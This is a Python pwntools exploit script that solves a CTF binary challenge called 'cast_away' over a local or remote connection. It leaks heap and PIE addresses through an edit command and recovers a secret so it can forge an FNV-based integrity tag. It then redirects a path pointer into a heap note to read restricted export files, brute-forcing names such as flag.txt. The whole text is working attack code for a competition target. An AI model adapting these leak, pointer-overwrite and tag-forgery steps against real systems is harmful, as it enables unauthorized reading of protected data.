import sys,re
from pwn import *
context.log_level='error'
MODE=sys.argv[1]
def fnv(b):
    h=0xcbf29ce484222325
    for x in b: h=((h^x)*0x100000001b3)&(2**64-1)
    return h
if MODE=='local': p=process('/home/sira/Documents/CTF/Lancang_Mekong_CTF_comp/solved/pwn_cast_away/cast_away')
else:
    host,port=MODE.split(':'); p=remote(host,int(port))
def cmd(s):
    p.recvuntil(b'castaway> '); p.sendline(s.encode() if isinstance(s,str) else s)
def U():
    lo,hi=0,(1<<64)-1
    while lo<hi:
        mid=(lo+hi)//2; cmd('UNLOCK %016x'%mid); l=p.recvline()
        if b'equal' in l: return
        if b'higher' in l: lo=mid+1
        else: hi=mid-1
    cmd('UNLOCK %016x'%lo); p.recvline()
def E(i,v):
    cmd('EDIT %d %016x'%(i,v&(2**64-1)))
    return int(p.recvline().split(b'previous=')[1].strip(),16)
def RD(i):
    v=E(i,0); E(i,v); return v
def run_read():
    cmd('RUN'); r=p.recvline()
    m=re.search(rb'export output \((\d+) bytes\):',r)
    if m and b'redacted' not in r:
        n=int(m.group(1)); d=p.recvn(n); p.recvn(1); return d,r.strip()
    return None,r.strip()
def prepare(n): cmd('PREPARE_EXPORT '+n); return p.recvline()
SSOV=0x8108
U(); cmd('SURVEY'); p.recvline(); cmd('SWITCH'); p.recvline()
intel={}
for nm in ['manifest.csv','readme.txt','public_sample.csv']:
    pl=prepare(nm)
    if b'prepared' in pl:
        d,st=run_read(); intel[nm]=d
        print("=== %s [%s] ==="%(nm,st.decode('latin1')))
        if d: print(d.decode('latin1','replace'))
prepare('readme.txt')
heap_leak=RD(0); szf=RD(4); tag=RD(5); mac0=RD(6); salt0=RD(7)
pie=tag-salt0-0x8080
secA=mac0^fnv(b'/srv/survey/exports/readme.txt')^fnv(p64(szf))^fnv(p64(salt0))
sso=pie+SSOV
print("[*] pie=%#x heap_leak=%#x secA=%#x"%(pie,heap_leak,secA))
# stage1 unlock NOTE
tp=b'/etc/hostname'
E(2,u64(tp[:8])); E(3,u64(tp[8:].ljust(8,b'\0'))); E(1,len(tp)); E(4,0x1000); E(0,sso)
E(6,fnv(tp)^fnv(p64(0x1000))^fnv(p64(salt0))^secA)
cmd('RUN'); r=p.recvline()
if b'redacted' not in r: print("[!] stage1 unexpected:",r); 
else: print("[+] NOTE unlocked")
cmd('NOTE_NEW 1024'); nl=p.recvline(); nid=int(nl.split(b'note ')[1].split(b' ')[0])
def write_note(path):
    data=path.encode()+b'\0'
    for i in range((len(data)+7)//8):
        ch=data[i*8:i*8+8].ljust(8,b'\0'); cmd('NOTE_WRITE %d %d %016x'%(nid,i*8,u64(ch))); p.recvline()
def set_meta(path):
    salt_cur=RD(7); E(1,len(path)); E(4,0x1000)
    E(6, fnv(path.encode())^fnv(p64(0x1000))^fnv(p64(salt_cur))^secA)
# calibrate delta using known-readable readme abs path
cal='/srv/survey/exports/readme.txt'
write_note(cal); set_meta(cal)
good_delta=None
for delta in range(0x10,0x1200,0x10):
    E(0, heap_leak+delta)
    d,st=run_read()
    if d is not None:
        good_delta=delta; print("[+] calibrated delta=%#x via readme (%d bytes)"%(delta,len(d))); break
if good_delta is None:
    print("[!] calibration failed"); p.close(); sys.exit()
note_addr=heap_leak+good_delta
# build candidate restricted names
allow={'readme.txt','manifest.csv','public_sample.csv'}
cands=[]
man=intel.get('manifest.csv') or b''
for m in re.findall(rb'[A-Za-z0-9_\-./]+\.(?:csv|txt|dat|tsv|json|xml)', man):
    s=m.decode().split('/')[-1]
    if s not in allow and s not in cands: cands.append(s)
for g in ['restricted_survey.csv','restricted.csv','survey.csv','survey_full.csv','full_survey.csv','private.csv','secret.csv','flag.txt','flag','restricted.txt','survey_restricted.csv']:
    if g not in cands: cands.append(g)
if len(sys.argv)>2:
    import os
    if os.path.exists(sys.argv[2]):
        cands=[x.strip() for x in open(sys.argv[2]) if x.strip()]
    else:
        cands=[x.strip() for x in sys.argv[2].split(',') if x.strip()]
print("[*] candidates:",cands)
for name in cands:
    path=name if name.startswith('/') else '/srv/survey/exports/'+name
    write_note(path); E(0,note_addr); set_meta(path)
    d,st=run_read()
    if d is not None and d.strip():
        print("\n####### %s [%s] #######"%(name,st.decode('latin1')))
        print(d.decode('latin1','replace'))
    else:
        print("[-] %s: %s"%(name,st.decode('latin1')))
p.close()
